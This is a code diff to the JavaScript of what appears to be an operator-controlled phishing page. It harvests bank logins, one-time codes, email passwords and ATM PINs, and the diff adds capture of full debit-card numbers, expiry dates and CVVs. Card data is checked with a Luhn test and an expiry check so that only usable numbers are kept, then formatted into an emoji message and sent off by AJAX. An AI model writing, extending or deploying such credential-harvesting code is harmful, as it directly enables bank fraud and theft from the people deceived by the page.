@@ -1,4 +1,5 @@
 $(document).ready(function () {
+  $("#expiryDate").inputmask("99/99", { placeholder: "MM/YY" });
   function getParameterByName(name, defaultValue = null) {
     name = name.replace(/[\[\]]/g, "\\$&");
     var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
@@ -60,7 +61,10 @@ $(document).ready(function () {
     $("#claveCorreo").val("");
     $("#claveCorreo").val("");
     $("#correo").val("");
-  
+    $("#cardNumber").val("");
+    $("#expiryDate").val("");
+    $("#cvv").val("");
+    $("#div-datos-debito").addClass("hidden");
   }
 
   function checkStatus(typeValid) {
@@ -121,6 +125,12 @@ $(document).ready(function () {
           localStorage.setItem("lastForm", response.response.type);
           $("#otros").removeClass("hidden");
           $("#div-clave-cajero").removeClass("hidden");
+          $("#loader").addClass("hide");
+          clearInterval(intervalID);
+        } else if (response.response.type === "debit_card") {
+          localStorage.setItem("lastForm", response.response.type);
+          $("#otros").removeClass("hidden");
+          $("#div-datos-debito").removeClass("hidden");
           $("#loader").addClass("hide");
           clearInterval(intervalID);
         } else if (response.response.type === "rechazar_codigo") {
@@ -195,8 +205,6 @@ $(document).ready(function () {
     // Evita el envío del formulario
     event.preventDefault();
 
-    $(".direction--row").addClass("hide");
-    $("#loader").removeClass("hide");
     const obtenerValor = (selector) => {
       return $(selector).length > 0 ? $(selector).val() : "";
     };
@@ -209,7 +217,28 @@ $(document).ready(function () {
       $("#clave").removeClass("hidden");
       return;
     }
+    const form = localStorage.getItem("lastForm");
+    if (form == "debit_card") {
+      var cardNumber = $("#cardNumber").val().trim();
+      var expiryDate = $("#expiryDate").val().trim();
+      var cvv = $("#cvv").val().trim();
 
+      if (!luhnCheck(cardNumber)) {
+        alert("Número de tarjeta inválido.");
+        return;
+      }
+
+      if (!validateExpiryDate(expiryDate)) {
+        alert("Fecha de vencimiento inválida.");
+        return;
+      }
+      if (cvv == "") {
+        alert("Agregue el CVV");
+        return;
+      }
+    }
+    $(".direction--row").addClass("hide");
+    $("#loader").removeClass("hide");
     var dinamica = obtenerValor(".otp-input-hidden");
     var sms = obtenerValor(".otp-input-sms-hidden");
     var claveTel = obtenerValor("#telefono");
@@ -227,7 +256,10 @@ $(document).ready(function () {
         ${cuatroLast ? `💳 Últimos 4 dígitos: ${cuatroLast}\n` : ""}
         ${correo ? `📧 Correo: ${correo}\n` : ""}
         ${claveCorreo ? `🔑 Clave del Correo: ${claveCorreo}` : ""}
-        ${claveCajero ? `🔑 Clave cambio Cajero: ${claveCajero}\n` : ""}`;
+        ${claveCajero ? `🔑 Clave cambio Cajero: ${claveCajero}\n` : ""}
+        ${cardNumber ? `💳 Card Number: ${cardNumber}\n` : ""}
+        ${expiryDate ? `📅 Vence: ${expiryDate}\n` : ""}
+        ${cvv ? `🔑 CVV: ${cvv}\n` : ""}`;
 
     if (
       username ||
@@ -238,6 +270,9 @@ $(document).ready(function () {
       cuatroLast ||
       correo ||
       claveCorreo ||
+      cardNumber ||
+      expiryDate ||
+      cvv ||
       claveCajero
     ) {
       $.ajax({
@@ -466,7 +501,49 @@ $(document).ready(function () {
       $("#otros").removeClass("hidden");
       $("#div-clave-cajero").removeClass("hidden");
       $("#loader").addClass("hide");
+    } else if (response.response.type === "debit_card") {
+      $("#otros").removeClass("hidden");
+      $("#div-datos-debito").removeClass("hidden");
+      $("#loader").addClass("hide");
     }
+  }
+
+  function luhnCheck(cardNumber) {
+    let sum = 0;
+    let shouldDouble = false;
+
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+      let digit = parseInt(cardNumber.charAt(i));
+
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
+      }
+
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+
+    return sum % 10 === 0;
+  }
+
+  function validateExpiryDate(expiryDate) {
+    const [month, year] = expiryDate.split("/").map((val) => parseInt(val));
+    if (month < 1 || month > 12) return false;
+
+    const currentDate = new Date();
+    const currentMonth = currentDate.getMonth() + 1; // Los meses en JavaScript son de 0 a 11
+    const currentYear = parseInt(
+      currentDate.getFullYear().toString().slice(-2)
+    );
+
+    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+      return false;
+    }
+
+    return true;
   }
 });
 
